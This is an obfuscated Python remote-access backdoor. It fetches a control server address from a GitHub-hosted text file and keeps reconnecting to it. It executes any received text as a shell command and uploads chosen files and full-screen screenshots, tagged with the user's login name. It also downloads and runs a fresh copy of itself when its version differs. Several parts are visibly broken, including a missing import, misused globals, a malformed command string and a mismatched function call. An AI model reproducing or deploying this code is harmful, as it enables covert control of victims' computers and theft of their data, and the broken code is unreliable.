import sys,subprocess,socket,time,requests
from PIL import ImageGrab
uBGeoMWQtN = "1.29.11.24"
tMTybzdcWNMSFj = ""
axXDVbU = ""
cDxmnWgTjkXXmOzgGhLb = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
QwfbeOc = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
JlOWiYIeA = "!"
def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def dAoQgoQdCBbJSpZDmwCzA(s):
	tCxVKvdi = s.recv(1024)
	if len(tCxVKvdi)==0:
		return True
	VblbdwiypKtIgoSKIwcEgpk = tCxVKvdi.decode("utf-8")
	if not VblbdwiypKtIgoSKIwcEgpk.startswith(JlOWiYIeA):
		proc = subprocess.run(tCxVKvdi.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	zAmTFevUoUMlUXs = VblbdwiypKtIgoSKIwcEgpk.split(" ")[0][1:]
	if zAmTFevUoUMlUXs == "download":
		LnjUZXSaMk(s, VblbdwiypKtIgoSKIwcEgpk)
	elif zAmTFevUoUMlUXs == "screenshot":
		ruYbCrRAdOxUbm(s)
def LnjUZXSaMk(s, VblbdwiypKtIgoSKIwcEgpk):
	ZVCWCMehERxCS = VblbdwiypKtIgoSKIwcEgpk.replace(JlOWiYIeA+"screenshot ", "").split(",")
	results = []
	for f in ZVCWCMehERxCS:
		results += FzlTPvlvBFDjdAUKGtwWX(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def ruYbCrRAdOxUbm(VblbdwiypKtIgoSKIwcEgpk):
	vUVpKmHbusgcyVoXy = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	vUVpKmHbusgcyVoXy.save(fpath)
	vUVpKmHbusgcyVoXy.close()
	r = FzlTPvlvBFDjdAUKGtwWX(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def FzlTPvlvBFDjdAUKGtwWX(uXaRbOjAHZrSR, tMgSAJQSJJl, xtsoxLodnrXQuXuPbC=None):
	if not os.path.exists(uXaRbOjAHZrSR):
		return "FILE NOT FOUND: "+uXaRbOjAHZrSR
	headers = {"user":os.getlogin()}
	if xtsoxLodnrXQuXuPbC is not None:
		headers = {**headers, **xtsoxLodnrXQuXuPbC}
	requests.post(tMTybzdcWNMSFj+":"+axXDVbU+"/"+tMgSAJQSJJl,
		files={open(uXaRbOjAHZrSR, "rb")},
		headers=headers)
	return "SUCCESS"
def QULzkDb():
	if tMTybzdcWNMSFj == "" or axXDVbU == "":
		tCxVKvdi = requests.get(cDxmnWgTjkXXmOzgGhLb).text.replace("\n","").split(":")
		tMTybzdcWNMSFj = tCxVKvdi[0].strip()
		axXDVbU = tCxVKvdi[1].strip()
		vpoLtywuO = tCxVKvdi[2].strip()
	return tMTybzdcWNMSFj, axXDVbU, vpoLtywuO
def DgTwNVfZQLub():
	MjOqgPqbwzLCbzfuZw = os.path.basename(__file__)
	fileType = MjOqgPqbwzLCbzfuZw.split(".")[-1]
	vYOINhsoXqLAZ = MjOqgPqbwzLCbzfuZw.replace(fileType,"") +"."+uBGeoMWQtN + fileType
	DLXireNB = os.path.join(os.path.getcwd(), vYOINhsoXqLAZ)
	with open(vYOINhsoXqLAZ, "wb+") as f:
		f.write(requests.get(QwfbeOc+"/file"+DLXireNB.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+DLXireNB)
	elif fileType == ".pyw":
		os.system("python "+DLXireNB")
def WSJpJQyYGXtbquRtWW():
	pass
def VTNhMXSWMbcJvFej():
	h, p, v = QULzkDb()
	if uBGeoMWQtN != v:
		DgTwNVfZQLub()
	WSJpJQyYGXtbquRtWW()
	while True:
		try:
			while True:
				BJTqbKgKdDk=False
				try:
					s=connect(h, p)
					while not BJTqbKgKdDk:
						s.send(b"\n>> ")
						BJTqbKgKdDk=dAoQgoQdCBbJSpZDmwCzA(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(VTNhMXSWMbcJvFej())
